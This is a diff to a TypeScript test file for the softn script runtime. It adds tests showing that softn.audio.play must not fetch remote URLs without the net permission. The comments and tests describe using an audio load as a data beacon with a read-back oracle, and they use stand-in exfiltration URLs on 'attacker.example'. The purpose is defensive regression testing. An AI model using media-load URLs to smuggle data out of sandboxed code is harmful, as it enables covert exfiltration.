@@ -14,6 +14,7 @@ import {
   createMockXDBModule,
   createMockNavModule,
   createConsoleModule,
+  type PermissionConfig,
   type ScriptContext,
 } from '../src/runtime/script-runtime';
 import type { ScriptBlock } from '../src/parser/ast';
@@ -76,9 +77,21 @@ function script(code: string): ScriptBlock {
  *  hops; a macrotask lets all of them land before the test fires the event. */
 const tick = () => new Promise<void>((resolve) => setTimeout(resolve, 0));
 
+/**
+ * Grants `net` by default, because most of these play a remote `https://` URL
+ * and that is now egress with a capability in front of it — see the
+ * withholding block at the bottom of this file. The tests above it are about
+ * what the element does once the sound is allowed to load, so the grant is a
+ * fixture, not the thing under test.
+ */
+const NET_GRANTED = { permissions: { net: { enabled: true } } } as PermissionConfig;
+
 /** The runtime plus the state object its script writes into, so callbacks
  *  that set a variable can be asserted on. */
-function makeRuntime(externalFunctions?: Record<string, (...args: unknown[]) => unknown>) {
+function makeRuntime(
+  externalFunctions?: Record<string, (...args: unknown[]) => unknown>,
+  permissionConfig: PermissionConfig | null = NET_GRANTED
+) {
   const state: Record<string, unknown> = {};
   const context: ScriptContext = {
     state,
@@ -91,6 +104,10 @@ function makeRuntime(externalFunctions?: Record<string, (...args: unknown[]) => 
   const runtime = createScriptRuntime(
     context, undefined, undefined, undefined, undefined, undefined, undefined, externalFunctions
   );
+  if (permissionConfig) {
+    (runtime as unknown as { setPermissionConfig(c: PermissionConfig): void })
+      .setPermissionConfig(permissionConfig);
+  }
   return Object.assign(runtime, { state });
 }
 
@@ -394,5 +411,134 @@ describe('softn.audio and the app closing', () => {
 
     runtime.cleanup();
     expect(built[0].paused).toBe(true);
+  });
+});
+
+/**
+ * softn.audio.play as an outbound channel.
+ *
+ * This was the only host call in the switch with no permission check, on the
+ * reasoning — written into the comment above the handler — that "sound is a
+ * nuisance, not a disclosure: it reads nothing, sends nothing". It sends. Run
+ * against the real runtime with every capability withheld and consent pending,
+ * `executeHostCall({kind:'audio.play', args:['https://attacker.example/beacon
+ * ?secret=1','']})` constructed an Audio with that exact URL and answered
+ * {played:true}. `new Audio(url)` issues the GET whether or not autoplay policy
+ * lets the sound out, and `whenEnded` reports 'ended' separately from 'error',
+ * so the bundle also learns whether the request succeeded — a read-back oracle
+ * on top of the beacon.
+ *
+ * What must keep working with no capability at all: the bundle's own sounds. A
+ * bundle-relative path, a blob: from asset() and an inline data: URL carry
+ * their bytes with them and reach nobody.
+ */
+describe('softn.audio.play with a remote source', () => {
+  const WITHHELD = { permissions: {}, consentPending: true } as PermissionConfig;
+  const BEACON = 'https://attacker.example/beacon?secret=1';
+
+  /** What the script sees: the refusal arrives as `error` on the result. */
+  async function play(
+    src: string,
+    permissionConfig: PermissionConfig | null,
+    externalFunctions?: Record<string, (...args: unknown[]) => unknown>
+  ): Promise<string> {
+    const runtime = makeRuntime(externalFunctions, permissionConfig);
+    const result = await runtime.loadScript(script(`
+      let outcome = ""
+      function go() {
+        softn.audio.play(${JSON.stringify(src)}, {}, function(r) {
+          outcome = r && r.error ? ("DENIED " + r.error) : "PLAYED"
+        })
+      }
+    `));
+    await result.functions.go();
+    runtime.cleanup();
+    return String(runtime.state.outcome);
+  }
+
+  it('does not construct the element while consent is pending', async () => {
+    expect(await play(BEACON, WITHHELD)).toMatch(/DENIED/);
+    // The assertion that matters. A refusal reported to the script is worth
+    // nothing if the request already left: `new Audio(url)` is the fetch.
+    expect(built).toHaveLength(0);
+  });
+
+  it('says the user has not allowed it, not that the author forgot to declare it', async () => {
+    expect(await play(BEACON, WITHHELD)).toMatch(/not allowed it/i);
+  });
+
+  it('refuses a bundle that ships no permission.json', async () => {
+    expect(await play(BEACON, null)).toMatch(/DENIED/);
+    expect(built).toHaveLength(0);
+  });
+
+  it('refuses a bundle that declared everything except net', async () => {
+    const config = { permissions: { camera: { enabled: true } } } as PermissionConfig;
+    expect(await play(BEACON, config)).toMatch(/DENIED/);
+    expect(built).toHaveLength(0);
+  });
+
+  it('honours allowed_hosts, the same list softn.net.fetch is held to', async () => {
+    const config = {
+      permissions: { net: { enabled: true, allowed_hosts: ['cdn.example.test'] } },
+    } as PermissionConfig;
+    expect(await play('https://cdn.example.test/theme.mp3', config)).toBe('PLAYED');
+    expect(built).toHaveLength(1);
+    built.length = 0;
+    expect(await play(BEACON, config)).toMatch(/Host not allowed/i);
+    expect(built).toHaveLength(0);
+  });
+
+  it('refuses plain http unless the bundle asked for it', async () => {
+    const config = { permissions: { net: { enabled: true } } } as PermissionConfig;
+    expect(await play('http://attacker.example/beacon.wav', config)).toMatch(/HTTP not allowed/i);
+    expect(built).toHaveLength(0);
+  });
+
+  it('is not fooled by a protocol-relative URL', async () => {
+    // `//host/x` matches no scheme, so it fell through resolveAudioSrc
+    // untouched — and the browser resolves it against the page's own https.
+    expect(await play('//attacker.example/beacon.wav', WITHHELD)).toMatch(/DENIED/);
+    expect(built).toHaveLength(0);
+  });
+});
+
+describe("a bundle's own sounds, with no capability at all", () => {
+  const WITHHELD = { permissions: {}, consentPending: true } as PermissionConfig;
+
+  it('plays a bundle-relative path while consent is pending', async () => {
+    // asset() answers with a blob: URL, which reaches nobody.
+    const asset = vi.fn((path: unknown) => `blob:resolved/${String(path)}`);
+    const runtime = makeRuntime({ asset }, WITHHELD);
+    const result = await runtime.loadScript(script(`
+      function ring() { softn.audio.play("assets/blip.wav") }
+    `));
+    await result.functions.ring();
+    expect(built).toHaveLength(1);
+    expect(built[0].src).toBe('blob:resolved/assets/blip.wav');
+    runtime.cleanup();
+  });
+
+  it('plays a data: URL while consent is pending', async () => {
+    const runtime = makeRuntime(undefined, WITHHELD);
+    const result = await runtime.loadScript(script(`
+      function ring() { softn.audio.play("data:audio/wav;base64,UklGRg==") }
+    `));
+    await result.functions.ring();
+    expect(built).toHaveLength(1);
+    runtime.cleanup();
+  });
+
+  it('plays a same-origin relative path while consent is pending', async () => {
+    // No asset() to resolve it, so it stays relative and the browser resolves
+    // it against the page. That is this origin, not egress.
+    const runtime = makeRuntime(undefined, WITHHELD);
+    const result = await runtime.loadScript(script(`
+      function ring() { softn.audio.play("sounds/blip.wav") }
+    `));
+    await result.functions.ring();
+    expect(built).toHaveLength(1);
+    expect(built[0].src).toBe('sounds/blip.wav');
+    runtime.cleanup();
   });
 });
